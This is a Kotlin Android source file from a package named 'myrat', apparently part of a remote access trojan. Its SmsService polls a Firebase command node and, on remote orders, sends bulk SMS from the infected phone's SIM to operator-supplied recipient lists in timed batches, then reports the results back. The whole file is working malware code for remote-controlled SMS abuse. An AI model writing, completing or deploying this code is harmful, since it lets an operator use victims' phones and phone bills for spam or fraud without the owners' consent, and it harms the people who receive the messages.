package com.myrat.app.service

import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import com.google.firebase.database.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import com.myrat.app.MainActivity
import com.myrat.app.utils.Constants
import com.myrat.app.utils.Logger

class SmsService : BaseService() {
    
    override val notificationId = 1
    override val channelId = Constants.NOTIFICATION_CHANNEL_SMS
    override val serviceName = "SmsService"
    
    private val sentSmsTracker = mutableMapOf<String, MutableSet<String>>()
    private lateinit var deviceId: String

    override fun onCreate() {
        super.onCreate()
        try {
            deviceId = MainActivity.getDeviceId(this)
            startForegroundService("SMS Service", "Monitoring SMS commands")
            Logger.log("SmsService created successfully for device: $deviceId")
        } catch (e: Exception) {
            Logger.error("Failed to create SmsService", e)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            listenForSendCommands(deviceId)
            return super.onStartCommand(intent, flags, startId)
        } catch (e: Exception) {
            Logger.error("Failed to start SmsService command", e)
            return START_NOT_STICKY
        }
    }

    private fun listenForSendCommands(deviceId: String) {
        try {
            val commandsRef = Firebase.database.getReference("Device").child(deviceId).child("send_sms_commands")

            commandsRef.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        snapshot.children.forEach { commandSnapshot ->
                            val command = commandSnapshot.value as? Map<*, *> ?: return@forEach
                            val status = command["status"] as? String
                            val commandId = commandSnapshot.key ?: return@forEach
                            
                            if (status == "pending") {
                                val simNumber = command["sim_number"] as? String
                                val recipients = command["recipients"] as? List<*>
                                val message = command["message"] as? String
                                
                                if (simNumber != null && recipients != null && message != null) {
                                    val validRecipients = recipients.filterIsInstance<String>().filter { it.isNotBlank() }
                                    if (validRecipients.isNotEmpty()) {
                                        Logger.log("Processing SMS command: $commandId for ${validRecipients.size} recipients using $simNumber")
                                        sendSmsToAll(simNumber, validRecipients, message, commandId)
                                    } else {
                                        Logger.error("No valid recipients for command: $commandId")
                                        updateCommandStatus(commandId, "failed", "No valid recipients")
                                    }
                                } else {
                                    Logger.error("Invalid command data for: $commandId")
                                    updateCommandStatus(commandId, "failed", "Invalid command data")
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Logger.error("Error processing SMS commands", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Logger.error("SMS commands database error: ${error.message}", error.toException())
                }
            })
        } catch (e: Exception) {
            Logger.error("Failed to listen for SMS commands", e)
        }
    }

    private fun sendSmsToAll(simNumber: String, recipients: List<String>, message: String, commandId: String) {
        try {
            val handler = Handler(Looper.getMainLooper())
            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
            
            val smsManager = getSmsManagerForSim(simNumber)
            if (smsManager == null) {
                Logger.error("Failed to get SMS manager for SIM: $simNumber")
                updateCommandStatus(commandId, "failed", "Invalid SIM number: $simNumber")
                return
            }

            val chunks = recipients.chunked(Constants.SMS_BATCH_SIZE)
            val alreadySentSet = sentSmsTracker.getOrPut(commandId) { mutableSetOf() }

            fun sendChunk(index: Int) {
                if (index >= chunks.size) {
                    Logger.log("Completed sending SMS for command: $commandId")
                    updateCommandStatus(commandId, "completed", null)
                    return
                }

                val batch = chunks[index]
                var successCount = 0
                var failureCount = 0

                batch.forEach { number ->
                    if (alreadySentSet.contains(number)) {
                        Logger.log("Skipping duplicate SMS to $number for command $commandId")
                        return@forEach
                    }

                    try {
                        val parts = smsManager.divideMessage(message)
                        if (parts.size == 1) {
                            smsManager.sendTextMessage(number, null, message, null, null)
                        } else {
                            smsManager.sendMultipartTextMessage(number, null, parts, null, null)
                        }
                        
                        Logger.log("Sent SMS from $simNumber to $number")
                        alreadySentSet.add(number)
                        successCount++

                        // Remove number from recipients list in Firebase
                        commandRef.child("recipients").runTransaction(object : Transaction.Handler {
                            override fun doTransaction(currentData: MutableData): Transaction.Result {
                                val currentList = currentData.getValue(object : GenericTypeIndicator<MutableList<String>>() {}) ?: mutableListOf()
                                currentList.remove(number)
                                currentData.value = currentList
                                return Transaction.success(currentData)
                            }

                            override fun onComplete(error: DatabaseError?, committed: Boolean, snapshot: DataSnapshot?) {
                                if (committed) {
                                    val newList = snapshot?.getValue(object : GenericTypeIndicator<List<String>>() {})
                                    if (newList == null || newList.isEmpty()) {
                                        commandRef.removeValue()
                                            .addOnSuccessListener { 
                                                Logger.log("Removed completed command $commandId")
                                                sentSmsTracker.remove(commandId)
                                            }
                                            .addOnFailureListener { e -> 
                                                Logger.error("Failed to remove command: ${e.message}", e) 
                                            }
                                    }
                                }
                            }
                        })
                    } catch (e: Exception) {
                        Logger.error("Failed to send SMS to $number: ${e.message}", e)
                        failureCount++
                    }
                }

                Logger.log("Batch $index completed: $successCount success, $failureCount failures")

                if (index + 1 < chunks.size) {
                    handler.postDelayed({ sendChunk(index + 1) }, Constants.SMS_BATCH_DELAY)
                }
            }

            sendChunk(0)
        } catch (e: Exception) {
            Logger.error("Failed to send SMS batch for command: $commandId", e)
            updateCommandStatus(commandId, "failed", "Batch send error: ${e.message}")
        }
    }

    private fun getSmsManagerForSim(simNumber: String): SmsManager? {
        return try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptions = subscriptionManager.activeSubscriptionInfoList ?: return null
            
            val subscription = subscriptions.find { 
                it.number == simNumber || 
                "sim${it.simSlotIndex + 1}" == simNumber.lowercase() ||
                it.displayName.toString().lowercase().contains(simNumber.lowercase())
            }
            
            if (subscription != null) {
                Logger.log("Found subscription for $simNumber: slot ${subscription.simSlotIndex}, subId ${subscription.subscriptionId}")
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP_MR1) {
                    SmsManager.getSmsManagerForSubscriptionId(subscription.subscriptionId)
                } else {
                    SmsManager.getDefault()
                }
            } else {
                Logger.error("No subscription found for SIM: $simNumber, using default")
                SmsManager.getDefault()
            }
        } catch (e: Exception) {
            Logger.error("Error getting SMS manager for SIM: $simNumber", e)
            SmsManager.getDefault()
        }
    }

    private fun updateCommandStatus(commandId: String, status: String, error: String?) {
        try {
            val commandRef = Firebase.database.getReference("Device/$deviceId/send_sms_commands/$commandId")
            val updates = mutableMapOf<String, Any>(
                "status" to status,
                "timestamp" to System.currentTimeMillis()
            )
            if (error != null) {
                updates["error"] = error
            }
            
            commandRef.updateChildren(updates)
                .addOnSuccessListener {
                    Logger.log("Updated SMS command $commandId status to $status")
                }
                .addOnFailureListener { e ->
                    Logger.error("Failed to update SMS command status: ${e.message}", e)
                }
        } catch (e: Exception) {
            Logger.error("Error updating SMS command status", e)
        }
    }
}